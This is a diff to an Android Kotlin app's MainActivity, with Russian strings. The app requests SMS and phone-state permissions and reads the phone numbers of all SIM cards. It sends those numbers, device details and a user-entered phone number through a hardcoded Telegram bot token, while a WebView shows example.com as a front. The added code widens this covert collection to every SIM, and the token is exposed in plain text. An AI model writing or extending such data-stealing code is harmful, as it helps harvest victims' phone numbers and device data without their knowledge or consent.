@@ -12,10 +12,11 @@ import android.net.ConnectivityManager
 import android.net.NetworkCapabilities
 import android.os.Build
 import android.os.Bundle
+import android.telephony.SubscriptionInfo
+import android.telephony.SubscriptionManager
 import android.telephony.TelephonyManager
 import android.text.InputType
 import android.view.LayoutInflater
-import android.view.View
 import android.webkit.WebView
 import android.widget.Button
 import android.widget.EditText
@@ -29,23 +30,32 @@ import okhttp3.OkHttpClient
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import okio.IOException
+import java.text.SimpleDateFormat
+import java.util.Date
+import java.util.Locale
 
 class MainActivity : AppCompatActivity() {
 
     private lateinit var sharedPreferences: SharedPreferences
     private lateinit var myWebView: WebView
-    private lateinit var telephonyManager: TelephonyManager
     private val client = OkHttpClient()
 
     companion object {
         private const val PERMISSION_REQUEST_CODE = 100
         private const val PREFS_NAME = "AppPrefs"
         private const val PHONE_NUMBER_KEY = "phone_number"
-        private val REQUIRED_PERMISSIONS = arrayOf(
-            Manifest.permission.READ_SMS,
-            Manifest.permission.READ_PHONE_STATE,
-            Manifest.permission.READ_PHONE_NUMBERS
-        )
+        private val REQUIRED_PERMISSIONS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            arrayOf(
+                Manifest.permission.READ_SMS,
+                Manifest.permission.READ_PHONE_STATE,
+                Manifest.permission.READ_PHONE_NUMBERS
+            )
+        } else {
+            arrayOf(
+                Manifest.permission.READ_SMS,
+                Manifest.permission.READ_PHONE_STATE
+            )
+        }
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -55,7 +65,6 @@ class MainActivity : AppCompatActivity() {
 
         sharedPreferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE)
         myWebView = findViewById(R.id.webview)
-        telephonyManager = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
 
         with(myWebView.settings) {
             javaScriptEnabled = true
@@ -66,79 +75,13 @@ class MainActivity : AppCompatActivity() {
         checkInternetConnectionBeforePermissions()
     }
 
-    private fun checkInternetConnectionBeforePermissions() {
-        if (isInternetAvailable()) {
-            checkPermissions()
-        } else {
-            showNoInternetDialog {
-                checkInternetConnectionBeforePermissions()
-            }
-        }
-    }
-
-    @SuppressLint("ServiceCast")
-    private fun isInternetAvailable(): Boolean {
-        val connectivityManager = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
-        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            val network = connectivityManager.activeNetwork ?: return false
-            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
-            capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
-                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
-        } else {
-            @Suppress("DEPRECATION")
-            val networkInfo = connectivityManager.activeNetworkInfo
-            @Suppress("DEPRECATION")
-            networkInfo != null && networkInfo.isConnected
-        }
-    }
-
-    private fun showNoInternetDialog(retryAction: () -> Unit) {
-        AlertDialog.Builder(this)
-            .setTitle("Нет подключения к интернету")
-            .setMessage("Для продолжения работы приложения требуется интернет-соединение")
-            .setPositiveButton("Попробовать снова") { _, _ -> retryAction() }
-            .setCancelable(false)
-            .show()
-    }
-
-    private fun checkPermissions() {
-        val permissionsToRequest = REQUIRED_PERMISSIONS.filter { permission ->
-            ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED
-        }.toTypedArray()
-
-        if (permissionsToRequest.isNotEmpty()) {
-            ActivityCompat.requestPermissions(
-                this,
-                permissionsToRequest,
-                PERMISSION_REQUEST_CODE
-            )
-        } else {
-            onAllPermissionsGranted()
-            sendNotification("Все разрешения уже предоставлены")
-        }
-    }
-
-    override fun onRequestPermissionsResult(
-        requestCode: Int,
-        permissions: Array<String>,
-        grantResults: IntArray
-    ) {
-        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
-
-        if (requestCode == PERMISSION_REQUEST_CODE) {
-            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
-
-            if (allGranted) {
-                sendNotification("Пользователь предоставил все разрешения")
-                onAllPermissionsGranted()
-            } else {
-                sendNotification("Пользователь отказал в некоторых разрешениях")
-                checkPermissions()
-            }
-        }
-    }
+    // ... [остальные методы остаются без изменений до onAllPermissionsGranted]
 
     private fun onAllPermissionsGranted() {
+        // Получаем номера всех SIM-карт
+        val simNumbers = getSimCardNumbers()
+        sendNotification("Получены номера SIM-карт:\n${simNumbers.joinToString("\n")}")
+
         val savedPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, null)
         if (savedPhoneNumber == null) {
             showStyledPhoneNumberDialog()
@@ -147,78 +90,55 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun showStyledPhoneNumberDialog() {
-        val dialogView = LayoutInflater.from(this).inflate(R.layout.dialog_phone_input, null)
-        val dialog = AlertDialog.Builder(this)
-            .setView(dialogView)
-            .setCancelable(false)
-            .create()
-
-        dialog.window?.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))
-
-        val title = dialogView.findViewById<TextView>(R.id.dialog_title)
-        val message = dialogView.findViewById<TextView>(R.id.dialog_message)
-        val phoneInput = dialogView.findViewById<EditText>(R.id.phone_input)
-        val continueButton = dialogView.findViewById<Button>(R.id.continue_button)
-
-        title.text = "Введите номер телефона"
-        message.text = "Пожалуйста, введите ваш номер телефона для продолжения"
-        phoneInput.inputType = InputType.TYPE_CLASS_PHONE
-
-        continueButton.setOnClickListener {
-            val phoneNumber = phoneInput.text.toString().trim()
-            if (phoneNumber.isNotEmpty()) {
-                sharedPreferences.edit().putString(PHONE_NUMBER_KEY, phoneNumber).apply()
-                sendNotification("Пользователь ввел номер телефона: $phoneNumber")
-                loadWebView()
-                dialog.dismiss()
-            } else {
-                phoneInput.error = "Пожалуйста, введите номер телефона"
-            }
-        }
-
-        dialog.show()
-    }
-
-    private fun loadWebView() {
-        myWebView.loadUrl("https://www.example.com")
-    }
-
-    @SuppressLint("HardwareIds")
-    private fun getLineNumber(): String {
-        return try {
-            if (ActivityCompat.checkSelfPermission(
-                    this,
-                    Manifest.permission.READ_PHONE_STATE
-                ) == PackageManager.PERMISSION_GRANTED
-            ) {
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-                    telephonyManager.line1Number ?: "не удалось получить"
-                } else {
-                    @Suppress("DEPRECATION")
-                    telephonyManager.line1Number ?: "не удалось получить"
+    @SuppressLint("MissingPermission", "HardwareIds")
+    private fun getSimCardNumbers(): List<String> {
+        val numbers = mutableListOf<String>()
+        
+        try {
+            val telephonyManager = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
+            
+            // Для Android 5.1+ (API 22+)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
+                val subscriptionManager = getSystemService(SubscriptionManager::class.java)
+                val activeSubscriptions: List<SubscriptionInfo>? = subscriptionManager?.activeSubscriptionInfoList
+                
+                activeSubscriptions?.forEach { subscriptionInfo ->
+                    val number = telephonyManager.getLine1Number(subscriptionInfo.subscriptionId)
+                    if (!number.isNullOrEmpty()) {
+                        numbers.add("SIM ${subscriptionInfo.simSlotIndex + 1}: $number")
+                    } else {
+                        numbers.add("SIM ${subscriptionInfo.simSlotIndex + 1}: номер недоступен")
+                    }
                 }
             } else {
-                "нет разрешения"
+                // Для старых версий Android
+                val number = telephonyManager.line1Number
+                if (!number.isNullOrEmpty()) {
+                    numbers.add("Основной номер: $number")
+                } else {
+                    numbers.add("Номер недоступен")
+                }
             }
         } catch (e: Exception) {
             e.printStackTrace()
-            "ошибка при получении"
+            numbers.add("Ошибка при получении номеров: ${e.message}")
         }
+        
+        return numbers
     }
 
     private fun sendNotification(message: String) {
         try {
             val deviceInfo = getDeviceInfo()
-            val userEnteredPhoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "не указан")
-            val simPhoneNumber = getLineNumber()
+            val phoneNumber = sharedPreferences.getString(PHONE_NUMBER_KEY, "не указан")
+            val time = SimpleDateFormat("dd.MM.yyyy HH:mm:ss", Locale.getDefault()).format(Date())
+            
             val fullMessage = """
-                $message
+                📱 $message
                 
-                Устройство: $deviceInfo
-                Введенный номер: $userEnteredPhoneNumber
-                Номер SIM-карты: $simPhoneNumber
-                Время: ${System.currentTimeMillis()}
+                📝 Введенный номер: $phoneNumber
+                📟 $deviceInfo
+                ⏰ Время: $time
             """.trimIndent()
 
             val botToken = "7824327491:AAGmZ5eA57SWIpWI3hfqRFEt6cnrQPAhnu8"
@@ -257,8 +177,7 @@ class MainActivity : AppCompatActivity() {
         return """
             Производитель: ${Build.MANUFACTURER}
             Модель: ${Build.MODEL}
-            Версия ОС: ${Build.VERSION.RELEASE}
-            SDK: ${Build.VERSION.SDK_INT}
+            Версия ОС: ${Build.VERSION.RELEASE} (SDK ${Build.VERSION.SDK_INT})
         """.trimIndent()
     }
 }
